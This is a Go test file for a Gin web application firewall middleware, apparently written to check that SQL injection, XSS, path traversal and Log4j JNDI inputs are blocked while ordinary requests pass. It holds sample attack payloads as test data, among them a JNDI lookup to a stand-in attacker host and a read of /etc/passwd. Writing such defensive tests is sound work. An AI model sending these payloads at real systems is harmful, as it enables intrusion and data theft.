package middleware

import (
	"bytes"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/gin-gonic/gin"
	"github.com/stretchr/testify/assert"
)

func setupWAFTestRouter() *gin.Engine {
	gin.SetMode(gin.TestMode)
	router := gin.New()
	router.Use(SoftwareWAFMiddleware())
	router.POST("/test", func(c *gin.Context) {
		body, _ := c.GetRawData()
		c.JSON(http.StatusOK, gin.H{"status": "ok", "echo": string(body)})
	})
	router.GET("/test", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{"status": "ok", "query": c.Query("q")})
	})
	return router
}

func TestSoftwareWAFMiddleware_ValidRequests(t *testing.T) {
	router := setupWAFTestRouter()

	// 1. Normal GET request
	req, _ := http.NewRequest(http.MethodGet, "/test?q=hello_world&page=1", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)
	assert.Equal(t, http.StatusOK, w.Code)

	// 2. Normal POST JSON request
	req, _ = http.NewRequest(http.MethodPost, "/test", bytes.NewBufferString(`{"username":"alice","action":"view_profile"}`))
	req.Header.Set("Content-Type", "application/json")
	w = httptest.NewRecorder()
	router.ServeHTTP(w, req)
	assert.Equal(t, http.StatusOK, w.Code)
}

func TestSoftwareWAFMiddleware_SQLInjection(t *testing.T) {
	router := setupWAFTestRouter()

	// 1. SQLi in Query Parameter
	sqliQueries := []string{
		"/test?q=admin'%20UNION%20SELECT%20*%20FROM%20users--",
		"/test?q=1%20OR%201=1",
		"/test?q=';%20DROP%20TABLE%20identities--",
		"/test?q=SELECT%20password%20FROM%20users",
	}
	for _, q := range sqliQueries {
		req, _ := http.NewRequest(http.MethodGet, q, nil)
		w := httptest.NewRecorder()
		router.ServeHTTP(w, req)
		assert.Equal(t, http.StatusBadRequest, w.Code, "Expected blocked for query: %s", q)
	}

	// 2. SQLi in Request Body
	req, _ := http.NewRequest(http.MethodPost, "/test", bytes.NewBufferString(`{"filter":"1 OR 1=1"}`))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)
	assert.Equal(t, http.StatusBadRequest, w.Code)
}

func TestSoftwareWAFMiddleware_XSS(t *testing.T) {
	router := setupWAFTestRouter()

	// 1. XSS in query
	xssQueries := []string{
		"/test?q=<script>alert(1)</script>",
		"/test?q=javascript:alert('pwned')",
		"/test?q=<img%20src=x%20onerror=alert(1)>",
	}
	for _, q := range xssQueries {
		req, _ := http.NewRequest(http.MethodGet, q, nil)
		w := httptest.NewRecorder()
		router.ServeHTTP(w, req)
		assert.Equal(t, http.StatusBadRequest, w.Code, "Expected blocked for XSS: %s", q)
	}

	// 2. XSS in body
	req, _ := http.NewRequest(http.MethodPost, "/test", bytes.NewBufferString(`{"bio":"<script>evil()</script>"}`))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)
	assert.Equal(t, http.StatusBadRequest, w.Code)
}

func TestSoftwareWAFMiddleware_ProbesAndHeaders(t *testing.T) {
	router := setupWAFTestRouter()

	// 1. Log4j JNDI probe in User-Agent header
	req, _ := http.NewRequest(http.MethodGet, "/test", nil)
	req.Header.Set("User-Agent", "${jndi:ldap://evil.attacker.com/exploit}")
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)
	assert.Equal(t, http.StatusBadRequest, w.Code)

	// 2. Path traversal in query parameter
	req, _ = http.NewRequest(http.MethodGet, "/test?path=../../etc/passwd", nil)
	w = httptest.NewRecorder()
	router.ServeHTTP(w, req)
	assert.Equal(t, http.StatusBadRequest, w.Code)

	// 3. Encoded path traversal in header
	req, _ = http.NewRequest(http.MethodGet, "/test", nil)
	req.Header.Set("X-Custom-Redirect", "%2e%2e%2f%2e%2e%2fsecret")
	w = httptest.NewRecorder()
	router.ServeHTTP(w, req)
	assert.Equal(t, http.StatusBadRequest, w.Code)
}
